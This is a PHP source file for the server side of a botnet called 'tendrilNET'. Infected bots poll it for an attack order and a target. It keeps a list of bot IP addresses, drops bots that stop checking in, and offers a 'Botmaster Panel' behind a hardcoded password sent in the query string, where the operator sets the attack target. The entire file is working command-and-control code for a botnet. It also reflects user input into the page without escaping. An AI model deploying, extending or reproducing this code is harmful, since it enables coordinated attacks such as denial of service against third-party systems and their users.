<?php
/*
########################################################################
# Copyright 2015 Daniel Haake
#
# This file is part of tendrilNET
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################
*/

$configFile = "data/config";
$botFile = "data/bots";

// load config (parameters for attack)
$conf = fopen($configFile, "r");
$content = fread($conf, filesize($configFile));
fclose($conf);
$content = explode("\n", $content);

$order = $content[0];
$target = $content[1];

$timestamp = time();

if($_GET['p'] == "bot") {
	print $order."\n".$target;

	// save bot parameter
	$clientIpAddress = $_SERVER["REMOTE_ADDR"];
	// read bots
	$bots = fopen($botFile, "r");
	$botsContent = fread($bots, filesize($botFile));
	fclose($bots);
	$botsContent = explode("\n", $botsContent);
	$writeBotsContent = "";
	$botInList = 0;
	for($i = 0; $i < count($botsContent); $i++) {
		$curBot = explode(" ", $botsContent[$i]);
		// if current bot already in list update timestamp
		if($curBot[0] == $clientIpAddress) {
			$botsContent[$i] = $clientIpAddress." ".$timestamp;
			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
			$botInList = 1;
		}
		// if bot in list is out of date, remove him
		elseif(($timestamp - (int)$curBot[1]) > 60) {
			// pass
		}
		else {
			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
		}
	}

	if ($botInList == 0) {
		$writeBotsContent = $writeBotsContent.$clientIpAddress." ".$timestamp;
	}

	$writeBots = fopen($botFile, "w");
	fwrite($writeBots, $writeBotsContent);
	fclose($writeBots);
}
elseif($_GET['p'] == "password") {
	// delete timed out bots
	// read bots
        $bots = fopen($botFile, "r");
        $botsContent = fread($bots, filesize($botFile));
        fclose($bots);
        $botsContent = explode("\n", $botsContent);
        $writeBotsContent = "";
	for($i = 0; $i < count($botsContent); $i++) {
		$curBot = explode(" ", $botsContent[$i]);
		// if bot in list is out of date, remove him
                if(($timestamp - (int)$curBot[1]) > 60) {
                        // pass
                }
                else {
                        $writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
                }

	}
	$writeBots = fopen($botFile, "w");
        fwrite($writeBots, $writeBotsContent);
        fclose($writeBots);

	// save new config
	if($_GET['order'] != "" && $_GET['target'] != "") {
		$writeConf = fopen($configFile, "w");
		fwrite($writeConf, $_GET['order']."\n".$_GET['target']);
		fclose($writeConf);
		$order = $_GET['order'];
		$target = $_GET['target'];
	}
	// display panel
	print "<h1>Botmaster Panel</h1>";
	print "<table border=\"1\">";
	print "<tr><td>Attack</td><td>Target</td><td>Bots Online</td></tr>";
	print "<tr>";
	print "<td>".$order."</td>";
	print "<td>".$target."</td>";
	print "<td>";
	$activeBots = fopen($botFile, "r");
	$content = fread($activeBots, filesize($botFile));
	fclose($activeBots);
	$number = explode("\n", $content);
	print count($number)-1;
	print "</td>";
	print "</tr>";
	print "</table>";

	print "<form method=\"get\">";
	print "<input type=\"radio\" name=\"order\" value=\"yes\" checked>yes";
	print "<input type=\"radio\" name=\"order\" value=\"no\">no";
        print "<input type=\"text\" name=\"target\" value=\"".$target."\"><br>";
	print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
        print "<input type=\"submit\" value=\"Submit\">";
        print "</form>";
}
else {
	// login form
	print "<!DOCTYPE html>";
	print "<html>";
	print "<head>";
	print "<title>tendrilNET Login Panel</title>";
	print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
	print "</head>";
	print "<body id=\"bodyLogin\">";

	print "<div id=\"headlineLogin\"><img width=\"50%\" src=\"images/logo.png\"></div>";
	print "<div id=\"loginForm\">";
	print "<form method=\"get\">";
	print "<table border=\"0\" align=\"center\">";
	print "<tr><td colspan=\"2\"><div id=\"formHeadlineLogin\"><b>Login</b></div></td></tr>";
	print "<tr><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"Password\"></td>";
	print "<td><input id=\"loginButton\" type=\"submit\" value=\"Login\"></td></tr>";
	print "</table>";
	print "</form>";
	print "</div>";

	print "</body>";
	print "</html>";
}
?>
